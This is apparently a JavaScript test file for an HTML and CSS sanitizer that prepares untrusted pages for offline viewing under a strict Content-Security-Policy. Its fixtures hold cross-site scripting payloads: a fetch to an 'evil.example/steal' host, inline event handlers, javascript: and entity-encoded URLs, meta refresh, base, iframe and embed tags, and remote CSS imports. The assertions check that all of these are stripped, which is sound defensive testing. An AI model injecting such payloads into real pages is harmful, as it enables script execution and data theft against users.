import { test } from "node:test";
import assert from "node:assert/strict";
import { OFFLINE_CSP, prepareOfflineHtml, sanitizeCss } from "./sanitizeHtml.js";

test("prepareOfflineHtml injects strict OFFLINE_CSP as the very first child of <head>", () => {
  const { srcdoc, blockedScripts, blockedResources } = prepareOfflineHtml(
    "<!doctype html><html><head><title>Safe</title><style>body { color: red; }</style></head><body><h1>Hi</h1></body></html>",
  );
  assert.equal(blockedScripts, 0);
  assert.equal(blockedResources, 0);
  assert.ok(srcdoc.includes(`<head><meta http-equiv="Content-Security-Policy" content="${OFFLINE_CSP}">`));
  assert.ok(srcdoc.includes("body { color: red; }"));
  assert.ok(srcdoc.includes("<h1>Hi</h1>"));
});

test("prepareOfflineHtml strips scripts, event handlers, javascript: URLs, iframes, embeds, refresh, base, and existing CSP", () => {
  const hostile = `<!doctype html>
<html>
<head>
  <meta http-equiv="Content-Security-Policy" content="default-src * 'unsafe-inline' 'unsafe-eval'">
  <meta http-equiv="refresh" content="0;url=https://evil.example/">
  <base href="https://evil.example/">
  <link rel="stylesheet" href="https://cdn.example/app.css">
</head>
<body onload="alert(1)">
  <script>fetch('https://evil.example/steal')</script>
  <iframe src="https://evil.example/frame"></iframe>
  <object data="https://evil.example/obj"></object>
  <embed src="https://evil.example/emb">
  <a href="javascript:alert(2)" onclick="alert(3)">Click</a>
  <a href="&#106;avascript:alert(4)">Entity JS</a>
  <img src="https://evil.example/pixel.gif" onerror="alert(5)">
  <img src="data:image/png;base64,iVBORw0KGgo=" alt="kept">
</body>
</html>`;

  const { srcdoc, blockedScripts, blockedResources } = prepareOfflineHtml(hostile);

  assert.doesNotMatch(srcdoc, /<script\b/i);
  assert.doesNotMatch(srcdoc, /<iframe\b/i);
  assert.doesNotMatch(srcdoc, /<object\b/i);
  assert.doesNotMatch(srcdoc, /<embed\b/i);
  assert.doesNotMatch(srcdoc, /<base\b/i);
  assert.doesNotMatch(srcdoc, /http-equiv\s*=\s*["']?refresh/i);
  assert.doesNotMatch(srcdoc, /default-src \*/i);
  assert.doesNotMatch(srcdoc, /\bon(?:load|click|error)\s*=/i);
  assert.doesNotMatch(srcdoc, /javascript:/i);
  assert.doesNotMatch(srcdoc, /https:\/\/cdn\.example\/app\.css/i);
  assert.doesNotMatch(srcdoc, /https:\/\/evil\.example\/pixel\.gif/i);

  // Kept safe elements and data: URI
  assert.ok(srcdoc.includes('src="data:image/png;base64,iVBORw0KGgo="'));
  assert.ok(srcdoc.includes(`<meta http-equiv="Content-Security-Policy" content="${OFFLINE_CSP}">`));
  // Blocked counts: refresh(1) + onload(1) + script(1) + iframe(1) + object(1) + embed(1) + js href(1) + onclick(1) + entity js(1) + onerror(1) = 10
  assert.equal(blockedScripts, 10);
  // Blocked resources: link stylesheet(1) + remote img(1) = 2
  assert.equal(blockedResources, 2);
});

test("sanitizeCss strips @import and external url(...) while preserving data: URIs", () => {
  const input = `
    @import url("https://evil.example/a.css");
    @import "relative.css";
    .a { background: url("https://evil.example/bg.png"); }
    .b { background: url(data:image/png;base64,AAA); }
    .c { clip-path: url(#clip); }
  `;
  const { css, blockedResources } = sanitizeCss(input);
  assert.doesNotMatch(css, /@import/i);
  assert.doesNotMatch(css, /evil\.example/);
  assert.ok(css.includes("data:image/png;base64,AAA"));
  assert.ok(css.includes("url(#clip)"));
  assert.equal(blockedResources, 3);
});

test("prepareOfflineHtml creates a <head> wrapper for fragment HTML", () => {
  const { srcdoc } = prepareOfflineHtml("<div>Hello fragment</div>");
  assert.ok(srcdoc.includes(`<head><meta http-equiv="Content-Security-Policy" content="${OFFLINE_CSP}">`));
  assert.ok(srcdoc.includes("<div>Hello fragment</div>"));
});
